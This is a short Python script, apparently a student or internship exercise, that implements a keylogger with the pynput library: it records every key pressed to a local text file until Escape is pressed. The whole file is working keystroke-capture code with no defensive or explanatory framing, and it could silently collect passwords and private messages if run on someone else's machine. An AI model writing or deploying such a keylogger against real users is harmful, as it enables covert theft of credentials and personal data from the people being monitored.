from pynput.keyboard import Key, Listener

# The file where keystrokes will be logged
log_file = "logged_text.txt"
# log_file = "C:/Users/USER/Desktop/Prodigy/KeyLogger/logged.txt"

def on_press(key):
    # Convert the key to a readable format
    key = str(key).replace("'", "")  # Remove quotes around letters

    # Write the key to the log file
    with open(log_file, "a") as f:
        f.write(key + "\n")

# Define the listener to stop on an escape key press (for stopping the keylogger)
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()